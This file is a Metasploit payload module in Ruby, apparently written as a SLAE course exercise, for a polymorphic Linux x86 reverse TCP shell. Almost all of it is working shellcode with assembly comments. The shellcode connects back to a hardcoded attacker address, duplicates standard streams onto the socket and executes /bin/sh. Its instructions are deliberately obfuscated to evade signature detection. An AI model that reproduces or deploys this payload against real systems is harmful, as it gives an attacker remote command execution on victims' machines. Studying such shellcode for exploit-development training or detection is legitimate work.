##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  CachedSize = 126

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Polymorphic Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'Guillaume Kaddouch - SLAE-681',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 52, 'ADDR' ],
              'LPORT'    => [ 58, 'n'    ],
            },
          'Payload' =>
 	    "\x31\xdb"                                +#   xor  ebx,ebx
  	    "\xf7\xe3"                                +#   mul  ebx
  	    "\xb0\x33"                                +#   mov  al,0x33
  	    "\x04\x33"                                +#   add  al,0x33
  	    "\x89\x5c\x24\xfc"                        +#   mov  DWORD PTR [esp-0x4],ebx
  	    "\x83\xec\x04"                            +#   sub  esp,0x4
  	    "\xb3\x01"                                +#   mov  bl,0x1
  	    "\x6a\x01"                                +#   push 0x1
  	    "\x6a\x02"                                +#   push 0x2
  	    "\x89\xe1"                                +#   mov  ecx,esp
  	    "\xcd\x80"                                +#   int  0x80
  	    "\x89\xc3"                                +#   mov  ebx,eax
  	    "\xb0\x01"                                +#   mov  al,0x1
  	    "\x59"                                    +#   pop  ecx
  	    "\x41"                                    +#   inc  ecx
  	    "\x0f\xef\xc1"                            +#   pxor mm0,mm1
  	    "\x49"                                    +#   dec  ecx
  	    "\xb0\x4f"                                +#   mov  al,0x4f
  	    "\x2c\x10"                                +#   sub  al,0x10
  	    "\xcd\x80"                                +#   int  0x80
  	    "\x41"                                    +#   inc  ecx
  	    "\x83\xe9\x02"                            +#   sub  ecx,0x2
  	    "\x79\xf4"                                +#   jns  8048083 <dup_jump>
  	    "\xb0\x33"                                +#   mov  al,0x33
  	    "\x04\x33"                                +#   add  al,0x33
  	    "\x68\xc0\xa8\xf1\x80"                    +#   push 0x80f1a8c0
  	    "\x66\x68\x1e\x61"                        +#   pushw  0x611e
  	    "\x66\x6a\x02"                            +#   pushw  0x2
  	    "\x87\xcc"                                +#   xchg esp,ecx
  	    "\x89\xcc"                                +#   mov  esp,ecx
  	    "\x6a\x10"                                +#   push 0x10
  	    "\x51"                                    +#   push ecx
  	    "\x53"                                    +#   push ebx
  	    "\xb3\x04"                                +#   mov  bl,0x4
  	    "\xfe\xcb"                                +#   dec  bl
  	    "\x89\xe1"                                +#   mov  ecx,esp
  	    "\xd9\xee"                                +#   fldz 
  	    "\xcd\x80"                                +#   int  0x80
  	    "\x31\xc0"                                +#   xor  eax,eax
  	    "\x52"                                    +#   push edx
  	    "\xbb\x1e\x1e\x62\x57"                    +#   mov  ebx,0x57621e1e
  	    "\x81\xc3\x10\x11\x11\x11"                +#   add  ebx,0x11111110
  	    "\x53"                                    +#   push ebx
  	    "\xff\x04\x24"                            +#   inc  DWORD PTR [esp]
  	    "\xbb\x0c\x40\x47\x4c"                    +#   mov  ebx,0x4c47400c
  	    "\x81\xc3\x22\x22\x22\x22"                +#   add  ebx,0x22222222
  	    "\x53"                                    +#   push ebx
  	    "\xff\x04\x24"                            +#   inc  DWORD PTR [esp]
  	    "\x89\xe3"                                +#   mov  ebx,esp
  	    "\x52"                                    +#   push edx
  	    "\x89\xe2"                                +#   mov  edx,esp
  	    "\x53"                                    +#   push ebx
  	    "\x89\xe1"                                +#   mov  ecx,esp
  	    "\xb0\x0b"                                +#   mov  al,0xb
  	    "\xcd\x80"                                 #   int  0x80

        }
      ))
  end

end